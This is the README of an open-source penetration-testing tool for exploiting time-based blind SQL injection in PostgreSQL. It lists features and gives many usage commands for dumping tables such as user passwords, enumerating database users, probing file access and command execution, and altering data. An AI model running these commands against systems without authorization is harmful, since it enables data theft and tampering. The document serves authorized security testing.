# PostgreSQL Blind SQL Injection Enumerator

A comprehensive tool for exploiting time-based blind SQL injection vulnerabilities in PostgreSQL databases. This tool enables database enumeration, data extraction, and security assessment through a sophisticated time-based technique.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## Features

- **Complete Database Enumeration**: Extract schemas, tables, columns, and data
- **Time-Based Blind Technique**: Uses timing differences to extract data
- **Multi-Threaded Extraction**: Parallel processing for faster data retrieval
- **Smart Caching**: Avoids redundant queries for better performance
- **Data Manipulation**: Update database values with multiple bypass strategies
- **Security Assessment**: Discover server vulnerabilities and assess security posture
- **User Management**: List, check permissions, and attempt to change database users
- **File System Access**: Check for file read/write capabilities
- **Command Execution**: Test for potential RCE vectors
- **Resume Capability**: Save progress and resume interrupted operations
- **Proof of Concept**: Generate timestamped PoC reports

## Installation

```bash
# Clone the repository
git clone https://github.com/xbz0n/psql-enum.git
cd psql-enum

# Install dependencies
pip install -r requirements.txt
```

### Requirements
- Python 3.6+
- Required packages (see requirements.txt):
  - requests
  - urllib3
  - tqdm (optional, for progress bars)

## Quick Start

1. **Capture an HTTP request with the injection point**

   Create a text file with your HTTP request, marking the injection point with `SQLI` placeholder:
   ```
   POST /api/endpoint HTTP/1.1
   Host: example.com
   Content-Type: application/json
   
   {"id": "SQLI", "action": "view"}
   ```

2. **Run a basic security assessment**

   ```bash
   python3 psql-enum.py request.txt -X
   ```

3. **Extract data from a table**

   ```bash
   python3 psql-enum.py request.txt -u users -C username,password,email
   ```

## Usage Examples

### Database Enumeration

```bash
# Get server information
python3 psql-enum.py request.txt -S

# List database users
python3 psql-enum.py request.txt --list-users

# Extract all columns from a table
python3 psql-enum.py request.txt -a users
```

### Data Extraction

```bash
# Dump a table with specific columns
python3 psql-enum.py request.txt -u users -C username,email

# Limit results (first 10 rows starting at offset 5)
python3 psql-enum.py request.txt -u users -L 10 -O 5

# Extract data from a specific database/schema
python3 psql-enum.py request.txt -u users -D customers

# Extract data one column at a time (more reliable but slower)
python3 psql-enum.py request.txt -u users --column-by-column
```

### Security Assessment

```bash
# Run all security checks
python3 psql-enum.py request.txt -X

# Check file read capabilities
python3 psql-enum.py request.txt -R

# Check file write capabilities
python3 psql-enum.py request.txt -W

# Check command execution capabilities
python3 psql-enum.py request.txt -E

# Check user permissions on a table
python3 psql-enum.py request.txt -P users
```

### Data Modification

```bash
# Update a value in the database
python3 psql-enum.py request.txt --update-value users email id 1 "new@example.com"
```

### Proof of Concept Generation

```bash
# Generate a simple PoC with timestamp
python3 psql-enum.py request.txt -p
```

## Command Reference

### Input Options
- `request_file` - Request file in cURL format with SQL injection point
- `-r`, `--resume FILE` - Resume file with extraction state
- `-d`, `--delay SECONDS` - Injection delay in seconds (default: 2.0)
- `-t`, `--threads NUM` - Number of threads for extraction (default: 30)
- `-f`, `--columns-file FILE` - File with column names to use instead of discovery

### Enumeration Options
- `-i`, `--extract-server-info` - Extract database server information
- `-a`, `--extract-all-columns TABLE` - Extract all columns from a table
- `-u`, `--dump-table TABLE` - Dump all data from a table
- `-s`, `--search-column PATTERN` - Search for columns matching a pattern

### Dump Control Options
- `-L`, `--dump-limit NUM` - Limit the number of rows to dump
- `-O`, `--dump-offset NUM` - Starting offset for rows to dump (default: 0)
- `-D`, `--database NAME` - Database/schema name (default: public)
- `-C`, `--columns LIST` - Comma-separated list of columns to extract

### Security Check Options
- `-W`, `--check-file-write` - Check if database allows writing files
- `-R`, `--check-file-read` - Check if database allows reading files
- `-E`, `--check-command-exec` - Check if command execution is possible
- `-S`, `--server-info` - Check server information
- `-X`, `--security-check-all` - Run all security checks
- `-p`, `--poc` - Generate a simple PoC output with timestamp

### User Management Options
- `--list-users` - List database users and their privileges
- `--change-user USERNAME` - Attempt to change to a different database user
- `-P`, `--check-permissions TABLE` - Check user permissions on a table

### General Options
- `-v`, `--verbose` - Enable verbose output

## How It Works

This tool exploits time-based blind SQL injection vulnerabilities by:

1. Injecting SQL that conditionally executes a `pg_sleep()` function
2. Measuring response time differences to determine if conditions are true
3. Using binary search algorithms to efficiently extract data
4. Parallelizing queries for faster extraction

## Security Considerations

This tool is designed for:
- Security professionals conducting authorized penetration tests
- System administrators auditing their own systems
- Educational purposes to understand SQL injection vulnerabilities

**DO NOT** use this tool against systems or applications without explicit permission.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Credits

Created by Ivan Spiridonov (@xbz0n)
Twitter: https://twitter.com/xbz0n
Email: ivanspiridonov@gmail.com

## Contributing

Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/xbz0n/psql-enum/issues).

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request 
